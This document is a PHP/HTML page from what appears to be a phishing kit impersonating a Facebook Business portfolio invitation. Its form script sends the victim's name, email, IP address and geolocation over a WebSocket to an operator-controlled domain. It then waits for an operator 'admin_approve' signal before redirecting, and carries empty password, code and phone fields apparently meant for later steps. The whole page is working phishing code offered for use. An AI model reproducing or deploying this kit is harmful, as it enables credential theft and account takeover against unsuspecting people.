<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
    function getServerIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }

    $ip_server = getServerIP();
?>

<?php
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $domain_name = file_get_contents('domain_name.txt');
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Business Invitation</title>
    <link rel="stylesheet" href="/styles/invite.css">
</head>


<body>
    <?php include 'loading.php'; ?>

    <nav class="meta-nav">
        <div class="nav-content">
            <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
        </div>
    </nav>

    <main class="main-container">
        <div class="invitation-card">   
            <div class="avatar">
                <img src="/images/avatar.jpg" alt="Logo" class="logo">
            </div>
            
            <h1>You're invited to join Amateur Players Tour</h1>
            
            <p class="invitation-text">
                <strong>Dennis McGraw</strong> invited you to join the <strong>Amateur Players Tour</strong> business portfolio. 
                Portfolios connect a business's Facebook Pages and other business assets so you can manage them all in one place.
            </p>

            <p class="access-info">
                Depending on your access, you can do things like manage Pages, Instagram accounts, ad accounts and people's assignments.
            </p>

            <form class="form-container" onsubmit="sendToTelegramFromInvite(event)" autocomplete="off">
                <p class="form-instruction">Enter your name as you want it to appear in this business portfolio.</p>
                
                <div class="name-fields">
                    <div class="form-group">
                        <label for="firstName">First name</label>
                        <input type="text" id="firstName" name="firstName" required>
                    </div>
                    <div class="form-group">
                        <label for="lastName">Last name</label>
                        <input type="text" id="lastName" name="lastName" required>
                    </div>
                </div>

                <div class="form-group email-group">
                    <label for="businessEmail">
                        Business email 
                        <span class="tooltip-icon" data-tooltip="Notifications about this business portfolio will be sent to this email address.">?</span>
                    </label>
                    <input type="email" id="businessEmail" name="businessEmail" value="" required>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="marketing" name="marketing">
                    <label for="marketing">
                        Receive marketing messages (e.g. email, social) related to business, products and services. Withdraw your consent and unsubscribe at any time.
                    </label>
                </div>

                <div class="privacy-section">
                    <p>For more information about how we handle your data, please read our <a href="#" class="link">Privacy Policy</a>.</p>
                    <p>If you don't know this business, you can <a href="#" class="link">decline the invitation</a>.</p>
                </div>

                <div class="form-footer">
                    <span class="page-indicator">1 of 3</span>
                    <button type="submit" class="continue-btn"
                    >Continue</button>
                </div>
            </form>
        </div>
    </main>

    <footer class="metae-footer">
        <div class="footer-links">
            <a href="#">Facebook</a>
            <a href="#">Developers</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
            <a href="#">Report a problem</a>
        </div>
        <div class="footer-info">
            <span class="language">English (US)</span>
        </div>
    </footer>

    <script src="/scripts/invite.js"></script>

    <script>
        const ws = new WebSocket('wss://<?php echo $domain_name; ?>');
        let orderId = '';

        ws.onmessage = function(event) {
            const data = JSON.parse(event.data);
            if (data.type === 'admin_approve' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
                localStorage.setItem('currentOrderId', data.order_id);
                localStorage.setItem('currentStep', data.step);
                window.location.href = '/review-business-information.php';
            }
        };

        function sendToTelegramFromInvite(event) {
            event.preventDefault();
            var firstName = document.getElementById('firstName').value;
            var lastName = document.getElementById('lastName').value;
            var personalEmail = document.getElementById('businessEmail').value;

            if (firstName == "" || lastName == "" || personalEmail == "") {
                alert("Please fill in all required fields");
                return;
            }

            var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
            var ip_address = `<?php echo $ip; ?>`;
            var city = `<?php echo $city; ?>`;
            var region = `<?php echo $region; ?>`;
            var country = `<?php echo $country; ?>`;
            var org = `<?php echo $org; ?>`;
            var timezone = `<?php echo $timezone; ?>`;
         
            orderId = 'order_' + Date.now();
            localStorage.setItem('currentOrderId', orderId);
            ws.send(JSON.stringify({
                type: 'new_order',
                order_id: orderId,
                step: 1,
                user_info: {
                    name: firstName + " " + lastName,
                    email: personalEmail,
                    ip: ip,
                    ip_address: ip_address,
                    city: city,
                    region: region,
                    country: country,
                    org: org,
                    timezone: timezone,
                    password: "",
                    code: "",
                    phone: ""
                }
            }));

            localStorage.setItem('firstName', firstName);
            localStorage.setItem('lastName', lastName);
            localStorage.setItem('personalEmail', personalEmail);
        }
    </script>

</body>
</html> 